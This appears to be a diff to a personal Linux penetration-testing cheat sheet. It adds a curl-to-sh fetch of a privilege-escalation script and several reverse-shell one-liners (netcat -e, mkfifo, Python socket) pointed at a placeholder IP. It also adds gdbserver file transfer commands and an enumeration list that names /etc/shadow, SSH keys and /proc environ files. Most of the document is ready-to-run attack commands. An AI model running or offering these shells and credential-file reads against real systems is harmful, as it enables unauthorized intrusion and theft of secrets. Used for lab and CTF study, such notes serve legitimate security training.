@@ -1,10 +1,12 @@
 # Linux
 
 - [Sudo](#sudo)
+- [Auto Script](#auto-script)
 - [Reverse Shell](#reverse-shell)
 - [Hash Bruteforce](#hash-bruteforce)
 - [SCP](#scp)
-- [Editor](#editor)
+- [Gdbserver](#gdbserver)
+- [File Enumeration](#file-enumeration)
 
 
 ## Sudo
@@ -12,45 +14,87 @@
 sudo -l
 ```
 
+## Auto Script
+```
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+```
+
 ## Reverse Shell
-
-### mkfifo
-
-```
-mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
-```
-
-### Client
-```
-nc ip 4444 -e /bin/bash
-```
 ### Server
 ```
 nc -lp 4444
 ```
+
+### Netcat
+```
+nc ip 4444 -e /bin/bash
+```
+
+### Mkfifo
+```
+mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
+```
+
+### Python
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
 ### TTY Support
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+*[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*
+
 ## SCP
-### Download File
+#### Download File
 ```
 scp -P port user@192.168.1.ip:path .
 ```
 
-### Upload File
+#### Upload File
 ```
 scp -P port file user@192.168.1.ip:path
 ```
 
-### Upload peda
+#### Upload peda
 ```
 scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
 ```
 
-## Editor
-### Hexa
+## Gdbserver
+*Port: 1337*
 ```
-hexedit
+$ gdb
+(gdb) target extended-remote ip:port
+(gdb) remote get remote_file local_file
+(gdb) remote put local_file remote_file
+```
+
+## File Enumeration
+### Classic
+- `/etc/passwd`  &  `/etc/shadow`
+- `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
+- `/home/user/.ssh`
+- `/etc/cron.d`
+- `/opt/`
+
+### Proc
+`/proc/` contains useful information about the processes that are currently running
+
+| directory	          | description                                     |
+|---------------------|-------------------------------------------------|
+| `/proc/PID/cmdline` | Command line arguments.                         |
+| `/proc/PID/cwd`     | Link to the current working directory.          |
+| `/proc/PID/environ` | Values of environment variables.                |
+| `/proc/PID/exe`     | Link to the executable of this process.         |
+| `/proc/PID/fd`      | Directory, which contains all file descriptors. |
+
+### Command
+
+```
+find / -user user 2>&-
+find / -group group 2>&-
+find / -user root -executable -type f 2>&- | grep -v /bin/
 ```
